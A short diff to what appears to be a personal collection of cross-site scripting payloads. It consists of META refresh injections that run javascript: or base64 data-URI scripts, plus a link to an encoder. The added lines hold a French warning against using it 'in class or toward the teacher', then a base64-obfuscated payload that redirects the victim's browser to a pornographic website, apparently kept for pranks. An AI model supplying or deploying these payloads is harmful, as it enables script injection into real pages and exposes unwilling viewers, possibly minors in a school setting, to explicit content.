@@ -1,3 +1,6 @@
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> 
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 http://ostermiller.org/calc/encode.html
+
+NE PAS UTILISER EN CLASSE, NI VERS LE PROF :
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24oJ2h0dHA6Ly93d3cueW91cG9ybi5jb20vY2F0ZWdvcnkvMjAvZ2F5LycpPC9zY3JpcHQ+">
